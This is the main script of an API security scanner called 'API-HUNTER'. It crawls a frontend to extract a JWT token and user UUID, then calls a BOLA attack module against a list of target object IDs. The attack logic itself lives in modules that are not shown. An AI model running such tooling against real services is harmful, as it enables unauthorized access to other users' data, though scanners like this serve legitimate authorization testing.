# scanner/scanner.py
from config import FRONTEND_URL, VULNERABLE_API_BASE, TARGET_UUIDS
from modules.crawler import discover_endpoints
from modules.bola_engine import run_bola_attack

def main():
    print("=== API-HUNTER INITIALIZED ===")
    
    # Phase 1: Credential Looting
    print("\n[PHASE 1] Crawling Frontend & Looting Credentials...")
    
    endpoints, looted_data = discover_endpoints(FRONTEND_URL)

    print(*endpoints)
    print(looted_data)
    
    attacker_token = looted_data.get("token")
    attacker_uuid = looted_data.get("uuid")

    if not attacker_token:
        print("\n[X] ERROR: Failed to extract JWT token during login. Aborting.")
        return

    dynamic_target_uuids = TARGET_UUIDS.copy()
    if attacker_uuid and attacker_uuid not in dynamic_target_uuids:
        dynamic_target_uuids.insert(0, attacker_uuid)

    # Phase 2: Active Scanning (BOLA)
    print("\n[PHASE 2] Executing BOLA Attack with Looted Token...")
    attack_results = run_bola_attack(dynamic_target_uuids, VULNERABLE_API_BASE, attacker_token)

    print("\n=== SCAN COMPLETE ===")

if __name__ == "__main__":
    main()